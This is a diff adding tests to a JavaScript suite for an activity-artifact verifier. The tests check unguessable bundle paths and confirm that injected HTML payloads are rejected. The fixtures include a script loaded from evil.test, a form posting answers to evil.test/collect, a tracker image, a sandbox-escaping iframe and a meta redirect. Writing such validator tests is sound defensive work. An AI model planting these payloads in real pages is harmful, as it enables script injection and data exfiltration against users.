@@ -6,6 +6,7 @@ import {
   authorizeActivityTelemetryMessage,
   buildActivitySessionContext,
   createActivityArtifactCandidates,
+  createUnguessableBundleRef,
   resolveApprovedActivityForBand,
   verifyActivityArtifact,
 } from "./server.js";
@@ -66,6 +67,40 @@ describe("activity artifact contracts", () => {
       expect(candidate.bundle_html).not.toContain("preview-assignment");
       expect(candidate.bundle_html).not.toContain("assignment_id:");
     }
+  });
+
+  it("creates cryptographically unguessable bundle references", () => {
+    const first = createUnguessableBundleRef("static");
+    const second = createUnguessableBundleRef("static");
+
+    expect(first).toMatch(
+      /^artifact-bundles\/static\/[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\/index\.html$/,
+    );
+    expect(second).not.toBe(first);
+  });
+
+  it.each([
+    ["script injection", "<script src='https://evil.test/payload.js'></script>", "external or executable URL references are forbidden"],
+    ["unsafe event handler", "<button onclick='window.top.location=`https://evil.test`'>Salir</button>", "inline event handlers are forbidden"],
+    ["external network reference", "<img src='https://evil.test/tracker.png'>", "external or executable URL references are forbidden"],
+    ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
+    ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
+    ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
+    ["sandbox escape", "<iframe sandbox='allow-same-origin allow-top-navigation' srcdoc='<p>escape</p>'></iframe>", "nested browsing contexts are forbidden"],
+    ["meta navigation", "<meta http-equiv='refresh' content='0;url=https://evil.test'>", "meta refresh is forbidden"],
+  ])("rejects adversarial %s artifacts with a specific reason", (_name, payload, reason) => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+    });
+    candidate.bundle_html = candidate.bundle_html.replace("</body>", `${payload}</body>`);
+
+    const result = verifyActivityArtifact(candidate);
+
+    expect(result.ok).toBe(false);
+    expect(result.errors).toContain(reason);
   });
 
   it("validates SDK telemetry messages", () => {
